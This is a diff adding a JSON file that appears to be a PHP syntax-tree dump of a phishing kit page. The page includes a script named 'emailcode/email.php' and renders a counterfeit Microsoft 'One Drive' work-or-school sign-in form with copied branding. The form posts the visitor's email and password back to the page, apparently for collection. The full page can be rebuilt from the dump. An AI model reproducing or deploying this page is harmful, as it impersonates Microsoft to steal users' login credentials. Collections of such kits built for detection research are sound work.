@@ -1,0 +1,35 @@
+[
+    {
+        "nodeType": "Stmt_Expression",
+        "expr": {
+            "nodeType": "Expr_Include",
+            "expr": {
+                "nodeType": "Scalar_String",
+                "value": "emailcode\/email.php",
+                "attributes": {
+                    "startLine": 2,
+                    "endLine": 2,
+                    "kind": 1
+                }
+            },
+            "type": 4,
+            "attributes": {
+                "startLine": 2,
+                "endLine": 2
+            }
+        },
+        "attributes": {
+            "startLine": 2,
+            "endLine": 4
+        }
+    },
+    {
+        "nodeType": "Stmt_InlineHTML",
+        "value": "<!DOCTYPE html>\n<html lang=\"en\">\n  <head>\n    <!-- Required meta tags -->\n    <meta charset=\"utf-8\">\n    <meta http-equiv=\"content-type\" content=\"text\/html\" \/>\n    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1, shrink-to-fit=no\">\n    <title>One Drive<\/title>\n\n    <!-- Font Awesome CSS -->\n    <link rel=\"stylesheet\" type=\"text\/css\" href=\"https:\/\/maxcdn.bootstrapcdn.com\/font-awesome\/4.7.0\/css\/font-awesome.min.css\">\n    <!-- Bootstrap CSS -->\n    <link rel=\"stylesheet\" href=\"https:\/\/maxcdn.bootstrapcdn.com\/bootstrap\/4.0.0-alpha.6\/css\/bootstrap.min.css\" integrity=\"sha384-rwoIResjU2yc3z8GV\/NPeZWAv56rSmLldC3R\/AZzGRnGxQQKnKkoFVhFQhNUwEyJ\" crossorigin=\"anonymous\">\n      <link rel=\"stylesheet\" type=\"text\/css\" href=\"css\/style.css\">\n\n<\/head>\n<body>\n\n<div class=\"officemail\">\n    <div class=\"row\">\n        <div class=\"col-md-8 col-lg-8 col-sm-8 col-xs-12\">\n            <img class=\"img-fluid ofc\" src=\"images\/officebg.jpg\" alt=\"Office\">\n         <\/div>\n        <div class=\"col-md-4 col-lg-4 col-sm-4 col-xs-12\">\n             <div class=\"officelogo\">\n                 <img class=\"img-fluid\" src=\"images\/officelogo.png\" alt=\"Office Logo\" \/>\n             <\/div>\n             <div class=\"officetitle\">\n                <h6>Work or school Microsoft account<\/h6>\n             <\/div>\n             <div class=\"officeloginform\">\n             <form class=\"form-horizontal\" name=\"office\" role=\"form\" method=\"POST\" action=\"\">\n             <div class=\"row\">\n                <div class=\"col-md-10 col-xs-10\">\n                    <h2>Please Login<\/h2>\n                    <hr>\n                <\/div>\n             <\/div>\n             <div class=\"row\">\n                <div class=\"col-md-10 col-xs-10\">\n                    <div class=\"form-group orangeclr\">\n                        <label class=\"sr-only\" for=\"email\">E-Mail Address<\/label>\n                        <div class=\"input-group mb-2 mr-sm-2 mb-sm-0\">\n                            <div class=\"input-group-addon\" style=\"width: 2.6rem\"><i class=\"fa fa-at\"><\/i><\/div>\n                            <input type=\"text\" name=\"email\" class=\"form-control\" id=\"email\"\n                                   placeholder=\"Email\" required autofocus>\n                        <\/div>\n                    <\/div>\n                <\/div>\n             <\/div>\n             <div class=\"row\">\n                <div class=\"col-md-10 col-xs-10\">\n                    <div class=\"form-group orangeclr\">\n                        <label class=\"sr-only\" for=\"password\">Password<\/label>\n                        <div class=\"input-group mb-2 mr-sm-2 mb-sm-0\">\n                            <div class=\"input-group-addon\" style=\"width: 2.6rem\"><i class=\"fa fa-key\"><\/i><\/div>\n                            <input type=\"password\" name=\"password\" class=\"form-control\" id=\"password\"\n                                   placeholder=\"Password\" required>\n                        <\/div>\n                    <\/div>\n                <\/div>\n            <\/div>\n            <div class=\"row\">\n                <div class=\"col-md-10 col-xs-10\" style=\"padding-top: .35rem\">\n                    <div class=\"form-check mb-2 mr-sm-2 mb-sm-0\">\n                        <label class=\"form-check-label\">\n                            <input class=\"form-check-input\" name=\"remember\"\n                                   type=\"checkbox\" >\n                            <span style=\"padding-bottom: .15rem\">Keep me signed in<\/span>\n                        <\/label>\n                    <\/div>\n                <\/div>\n            <\/div>\n            <div class=\"row\" style=\"padding-top: 1rem\">\n                <div class=\"col-md-10 col-xs-10\">\n                    <input type=\"hidden\" name=\"logintype\" value=\"office\">\n                    <button type=\"submit\" name=\"submit_btn\" class=\"btn btn-success signin\"><i class=\"fa fa-sign-in\"><\/i> Sign in<\/button>\n                    <a class=\"btn btn-link\" href=\"\/password\/reset\">Can't access your account?<\/a>\n                <\/div>\n             <\/div>\n             <\/form>\n             <\/div>\n             <div class=\"footer\">\n                <div class=\"row\">\n                    <div class=\"col-md-6 col-sm-6 col-xs-12 col-lg-6\">\n                        <div class=\"copyrightmicrosoft\">&#169; 2018 Microsoft<\/div>\n                        <ul class=\"footermenumicrosoft\">\n                            <li><a href=\"#\">Terms<\/a><\/li>\n                            <li><a href=\"#\">Privacy & Cookies<\/a><\/li>\n                        <\/ul>\n                    <\/div>\n                    <div class=\"col-md-6 col-sm-6 col-xs-12 col-lg-6\">\n                        <div class=\"microsoftlogomt\">\n                            <img src=\"images\/microsoftlogo.png\" alt=\"Footerlogo\" \/>\n                        <\/div>\n                    <\/div>\n                <\/div>\n             <\/div>\n        <\/div>\n    <\/div>\n<\/div>\n<!-- jQuery first, then Tether, then Bootstrap JS. -->\n    <script src=\"https:\/\/code.jquery.com\/jquery-3.1.1.slim.min.js\" integrity=\"sha384-A7FZj7v+d\/sdmMqp\/nOQwliLvUsJfDHW+k9Omg\/a\/EheAdgtzNs3hpfag6Ed950n\" crossorigin=\"anonymous\"><\/script>\n    <script src=\"https:\/\/cdnjs.cloudflare.com\/ajax\/libs\/tether\/1.4.0\/js\/tether.min.js\" integrity=\"sha384-DztdAPBWPRXSA\/3eYEEUWrWCy7G5KFbe8fFjk5JAIxUYHKkDx6Qin1DkWx51bBrb\" crossorigin=\"anonymous\"><\/script>\n    <script src=\"https:\/\/maxcdn.bootstrapcdn.com\/bootstrap\/4.0.0-alpha.6\/js\/bootstrap.min.js\" integrity=\"sha384-vBWWzlZJ8ea9aCX4pEW3rVHjgjt7zpkNpZk+02D9phzyeVkE+jo0ieGizqPLForn\" crossorigin=\"anonymous\"><\/script>\n<\/body>\n<\/html>\n",
+        "attributes": {
+            "startLine": 4,
+            "hasLeadingNewline": true,
+            "endLine": 111
+        }
+    }
+]
